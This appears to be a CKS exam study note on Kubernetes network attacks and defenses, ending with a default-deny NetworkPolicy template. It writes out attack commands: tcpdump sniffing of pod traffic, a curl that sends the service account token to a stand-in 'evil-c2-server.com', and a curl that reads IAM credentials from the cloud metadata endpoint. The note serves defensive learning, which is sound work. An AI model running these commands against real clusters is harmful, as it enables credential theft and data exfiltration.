# Network Attacks

By default, **all pods in a Kubernetes cluster can communicate with each other** — no network isolation unless Network Policies are applied. This makes network-based attacks highly effective once inside the cluster.

---

## ⚠️ Attack Vectors

### 1. Pod-to-Pod Traffic Sniffing
- Without Network Policies, a compromised pod can reach any other pod directly.
- Attacker deploys a sniffer (tcpdump) to capture unencrypted service traffic.

```bash
# Inside an attacker pod with hostNetwork
tcpdump -i eth0 port 80 -w /tmp/capture.pcap

# Or sniff all cluster traffic (if hostNetwork: true)
tcpdump -i any -n
```

### 2. DNS Spoofing / Poisoning
- Attacker intercepts DNS queries within the cluster.
- Redirects traffic for `my-service.default.svc.cluster.local` to attacker-controlled pod.
- Possible if attacker has `hostNetwork: true` or runs on same node.

### 3. Service Account Token Exfiltration via Network
- Attacker inside a pod calls external C2 server using egress traffic (no egress policy = open).
- Sends stolen SA tokens, secrets, or environment variables out of the cluster.

```bash
# No egress policy — attacker freely calls external server
curl http://evil-c2-server.com/exfil --data "$(cat /run/secrets/kubernetes.io/serviceaccount/token)"
```

### 4. Man-in-the-Middle (MITM) on Service Mesh
- If service-to-service traffic is unencrypted (no mTLS), attacker intercepts it.
- Possible with ARP poisoning on pod network level.

### 5. Node Port / LoadBalancer Scanning
- Exposed NodePort or misconfigured LoadBalancer lets attacker reach internal services from outside.
- Metadata APIs (e.g. AWS `169.254.169.254`) reachable from pods to steal cloud credentials.

```bash
# From inside a pod — reach cloud metadata
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

## 🛡 Defenses (CKS exam focus)

| Attack | Defense |
|---|---|
| Pod-to-pod sniffing | Network Policies (default deny all), mTLS (service mesh) |
| DNS spoofing | Network Policies restrict pod DNS access |
| Token exfiltration | Egress Network Policy — deny all egress by default |
| Cloud metadata SSRF | Block `169.254.169.254` via egress NetworkPolicy |
| MITM | Enable mTLS between services (Istio, Linkerd) |

## 📋 Default-Deny Network Policy Template

```yaml
# Block all ingress and egress by default
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: default
spec:
  podSelector: {}
  policyTypes:
    - Ingress
    - Egress
```

---

## 🔗 Related

- [[The_Attack]]
- [[Lateral Movement]]
- [[Network Policies]]

🏷️ Tags: #cks #attack #network #sniffing #exfiltration #networkpolicy #dns #mtls
